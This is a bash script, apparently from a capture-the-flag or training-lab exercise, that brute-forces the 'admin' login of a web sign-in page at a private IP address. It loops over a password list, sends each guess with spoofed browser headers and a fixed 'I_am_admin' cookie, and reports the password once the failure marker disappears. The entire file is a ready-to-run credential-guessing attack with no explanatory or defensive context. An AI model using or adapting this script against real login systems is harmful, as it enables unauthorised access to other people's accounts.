#!/bin/bash

PASSWORD=$(cat password.txt)

for STR in $PASSWORD;
do
	RET=$(curl -s "http://10.11.200.146/?page=signin&username=admin&password=${STR}&Login=Login#" -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://10.11.200.146/?page=signin' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1')

	LOGIN=$(echo "$RET" | grep "WrongAnswer")
	if [ ${#LOGIN} -eq 0 ]; then
		echo "THE PASSWORD IS: '$STR'"
		exit 0;
	else
		echo "THE PASSWORD IS NOT: '$STR'"
	fi
done
